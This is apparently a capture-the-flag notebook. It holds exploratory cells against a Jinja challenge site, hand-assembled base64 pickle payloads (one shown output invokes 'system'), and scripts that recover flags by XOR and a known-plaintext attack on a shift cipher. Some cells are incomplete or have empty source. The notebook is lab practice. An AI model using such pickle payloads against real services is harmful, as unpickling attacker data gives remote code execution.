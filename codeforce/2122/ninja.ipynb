{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "9c082cdb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hello, Hello mr ninja jinja!\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "url = 'https://ultra-jinja---warmup.challenge.haruulzangi.mn/'\n",
    "data = {'username': 'Hello mr ninja jinja'}\n",
    "response = requests.post(url, data=data)\n",
    "\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd3e2602",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "gAQoXZRo/2Uu\n"
     ]
    }
   ],
   "source": [
    "import pickle, base64\n",
    "\n",
    "index_to_check = \n",
    "\n",
    "payload = b'\\x80\\x04'  # PROTO 4\n",
    "payload += b'('        # MARK\n",
    "payload += b']'        # EMPTY_LIST\n",
    "payload += b'\\x94'     # MEMOIZE index 0\n",
    "\n",
    "payload += b'h' + bytes([index_to_check])  # BINGET 49\n",
    "payload += b'e'  # APPENDS\n",
    "payload += b'.'  # STOP\n",
    "\n",
    "b64_payload = base64.b64encode(payload).decode()\n",
    "print(b64_payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "8409a9cc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x04(]\\x94h-e.'"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "f0c1588a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'cnt\\nsystem\\np0\\n(Va\\np1\\ntp2\\nRp3\\n.'"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickled_payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8dd458c4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Recovered key bytes: [97]\n",
      "Decrypted flag: \u001a\u0011\u001dz8b\u001835B\ti\u000b\u0003\fP{2@o/\u000e8,Mi\u001e\n",
      "g_S(A\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "194c34a6",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ajf\\x01C\\x19cHN9r\\x12pxw+\\x00\\nsI;\\x14TuCW6\\x12eq\\x1c$(S:'"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "0966b4cb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'a§jìf\\x01C\\x19c\\x86HïÑ\\x94Nü\\x9eí9rü\\x12pxw+Â\\x00\\nsÛI;\\x14TuCW6\\x12ùeçqÒ\\x1c$(SË:\\x8a'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''.join([chr(x ^ 0x1A) for x in data])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "id": "5581890a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Successfully generated the sacred word! ✨\n",
      "FLAG: tAhseposdoup~o~wsdoup~uox~~pt\n"
     ]
    }
   ],
   "source": [
    "def solve():\n",
    "    \"\"\"\n",
    "    Re-implements the C code's logic to generate the secret string.\n",
    "    \"\"\"\n",
    "    \n",
    "    # --- YOU MUST EXTRACT THESE VALUES FROM THE BINARY ---\n",
    "    # These are placeholder values to make the script runnable.\n",
    "    # Use a disassembler or debugger to find the actual data.\n",
    "    \n",
    "    # g_404010: The length of the flag.\n",
    "    FLAG_LENGTH = 29\n",
    "    \n",
    "    # g_4021f8: The first data array (bytes).\n",
    "    DATA_ARRAY_1 = [\n",
    "        0x2e, 0x46, 0x61, 0x69, 0x74, 0x68, 0x20, 0x69, 0x73, 0x20, \n",
    "        0x74, 0x68, 0x65, 0x20, 0x62, 0x69, 0x72, 0x64, 0x20, 0x74, \n",
    "        0x68, 0x61, 0x74, 0x20, 0x66, 0x65, 0x65, 0x6c, 0x73\n",
    "    ]\n",
    "    \n",
    "    # The integer array at 0x4040C0 (4202944).\n",
    "    DATA_ARRAY_2 = [\n",
    "        0x5a, 0x07, 0x09, 0x1a, 0x11, 0x18, 0x4f, 0x1a, 0x17, 0x4f, \n",
    "        0x01, 0x18, 0x1b, 0x4f, 0x1c, 0x1e, 0x01, 0x00, 0x4f, 0x01, \n",
    "        0x18, 0x1f, 0x01, 0x4f, 0x1e, 0x1b, 0x1b, 0x1c, 0x07\n",
    "    ]\n",
    "    # ----------------------------------------------------\n",
    "\n",
    "    flag = bytearray()\n",
    "\n",
    "    # Initialize v2 and v3 for the first character (i=0)\n",
    "    v2 = 90\n",
    "    v3 = 46\n",
    "\n",
    "    for i in range(FLAG_LENGTH):\n",
    "        # On the first iteration, use the initial v2 and v3\n",
    "        if i > 0:\n",
    "            # For all other iterations, update v2 and v3 from the data arrays\n",
    "            v3 = DATA_ARRAY_1[i]\n",
    "            v2 = DATA_ARRAY_2[i]\n",
    "\n",
    "        # Generate the next character of the flag\n",
    "        flag_char = (v3 ^ v2) & 0xFF\n",
    "        flag.append(flag_char)\n",
    "        \n",
    "    print(\"[+] Successfully generated the sacred word! ✨\")\n",
    "    print(f\"FLAG: {flag.decode('utf-8')}\")\n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    solve()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "id": "a14d3f08",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] Deriving key using known plaintext attack...\n",
      "    Ciphertext: KM20\n",
      "    Plaintext:  HZ20\n",
      "0\n",
      "0\n",
      "3\n",
      "13\n",
      "0\n",
      "13\n",
      "\n",
      "[*] Decrypting the full string...\n",
      "Encrypted String: KM2025{7iyx_y9kdtyk_jo$uu}\n",
      "Derived Key:      [3, 13, 0, 0]\n",
      "Full Decryption:  HZ2092{7flx_v6kdqlk_gb$ur}\n",
      "----------------------------------------\n",
      "Final Flag:       HZ2025{7flx_v6kdqlk_gb$ur}\n"
     ]
    }
   ],
   "source": [
    "def reverse_encryption(encrypted_text, key):\n",
    "    \"\"\"\n",
    "    Accurately reverses the encryption logic from the provided C code.\n",
    "\n",
    "    The function iterates through each character of the encrypted text and\n",
    "    applies the correct decryption formula based on its type (uppercase,\n",
    "    lowercase, digit, or symbol) using a repeating key.\n",
    "\n",
    "    Args:\n",
    "        encrypted_text (str): The string to be decrypted.\n",
    "        key (list[int]): The integer key array used for decryption.\n",
    "\n",
    "    Returns:\n",
    "        str: The decrypted plaintext string.\n",
    "    \"\"\"\n",
    "    decrypted_chars = []\n",
    "    key_length = len(key)\n",
    "\n",
    "    for i, char in enumerate(encrypted_text):\n",
    "        # Select the current key value based on character index\n",
    "        current_key = key[i % key_length]\n",
    "        char_code = ord(char)\n",
    "\n",
    "        if 'A' <= char <= 'Z':\n",
    "            # Reverse the logic for uppercase letters:\n",
    "            # C equivalent: ((char_code - 'A' - key + 26) % 26) + 'A'\n",
    "            new_char_code = ((char_code - ord('A') - current_key + 26) % 26) + ord('A')\n",
    "            decrypted_chars.append(chr(new_char_code))\n",
    "        \n",
    "        elif 'a' <= char <= 'z':\n",
    "            # Reverse the logic for lowercase letters:\n",
    "            # C equivalent: ((char_code - 'a' - key + 26) % 26) + 'a'\n",
    "            new_char_code = ((char_code - ord('a') - current_key + 26) % 26) + ord('a')\n",
    "            decrypted_chars.append(chr(new_char_code))\n",
    "\n",
    "        elif '0' <= char <= '9':\n",
    "            # Reverse the logic for digits:\n",
    "            # C equivalent: ((char_code - '0' - key + 10) % 10) + '0'\n",
    "            print(current_key)\n",
    "            new_char_code = ((char_code - ord('0') - current_key + 10) % 10) + ord('0')\n",
    "            decrypted_chars.append(chr(new_char_code))\n",
    "\n",
    "        else:\n",
    "            # Any other characters (symbols) are not changed\n",
    "            decrypted_chars.append(char)\n",
    "            \n",
    "    return \"\".join(decrypted_chars)\n",
    "\n",
    "def find_key(ciphertext, plaintext):\n",
    "    \"\"\"\n",
    "    Derives the encryption key using a known-plaintext attack by comparing\n",
    "    a ciphertext segment with its corresponding plaintext.\n",
    "\n",
    "    Args:\n",
    "        ciphertext (str): A piece of the encrypted text (e.g., \"KM20\").\n",
    "        plaintext (str): The corresponding known decrypted text (e.g., \"HZ20\").\n",
    "\n",
    "    Returns:\n",
    "        list[int]: The derived key as a list of integers.\n",
    "    \"\"\"\n",
    "    if len(ciphertext) != len(plaintext):\n",
    "        raise ValueError(\"Ciphertext and plaintext must have the same length.\")\n",
    "\n",
    "    key = []\n",
    "    for c_char, p_char in zip(ciphertext, plaintext):\n",
    "        c_code = ord(c_char)\n",
    "        p_code = ord(p_char)\n",
    "\n",
    "        if 'A' <= c_char <= 'Z' and 'A' <= p_char <= 'Z':\n",
    "            # key = (ciphertext_char - plaintext_char + 26) % 26\n",
    "            k = (c_code - p_code + 26) % 26\n",
    "            key.append(k)\n",
    "        elif 'a' <= c_char <= 'z' and 'a' <= p_char <= 'z':\n",
    "            # key = (ciphertext_char - plaintext_char + 26) % 26\n",
    "            k = (c_code - p_code + 26) % 26\n",
    "            key.append(k)\n",
    "        elif '0' <= c_char <= '9' and '0' <= p_char <= '9':\n",
    "            # key = (ciphertext_char - plaintext_char + 10) % 10\n",
    "            k = (c_code - p_code + 10) % 10\n",
    "            key.append(k)\n",
    "        elif c_char == p_char:\n",
    "            # If characters are identical (like symbols), the key value is 0.\n",
    "            key.append(0)\n",
    "        else:\n",
    "            raise ValueError(f\"Cannot determine key for mismatched types: '{c_char}' and '{p_char}'\")\n",
    "            \n",
    "    return key\n",
    "\n",
    "# --- Main execution block ---\n",
    "\n",
    "# The original encrypted message from the binary\n",
    "encrypted_string = \"KM2025{7iyx_y9kdtyk_jo$uu}\"\n",
    "\n",
    "# Known parts of the plaintext and ciphertext to derive the key\n",
    "known_ciphertext_prefix = \"KM20\"\n",
    "known_plaintext_prefix = \"HZ20\"\n",
    "\n",
    "print(f\"[*] Deriving key using known plaintext attack...\")\n",
    "print(f\"    Ciphertext: {known_ciphertext_prefix}\")\n",
    "print(f\"    Plaintext:  {known_plaintext_prefix}\")\n",
    "\n",
    "# Automatically find the key based on the known prefixes\n",
    "derived_key = find_key(known_ciphertext_prefix, known_plaintext_prefix)\n",
    "\n",
    "# Perform the full decryption using the auto-derived key\n",
    "decrypted_string = reverse_encryption(encrypted_string, derived_key)\n",
    "\n",
    "# The expected flag format is HZ2025{...}, so we format our result accordingly\n",
    "final_flag = f\"HZ2025{{{decrypted_string[7:]}\"\n",
    "\n",
    "# 🚩 Print the analysis and the final, correct flag\n",
    "print(\"\\n[*] Decrypting the full string...\")\n",
    "print(f\"Encrypted String: {encrypted_string}\")\n",
    "print(f\"Derived Key:      {derived_key}\")\n",
    "print(f\"Full Decryption:  {decrypted_string}\")\n",
    "print(\"-\" * 40)\n",
    "print(f\"Final Flag:       {final_flag}\")\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "and",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
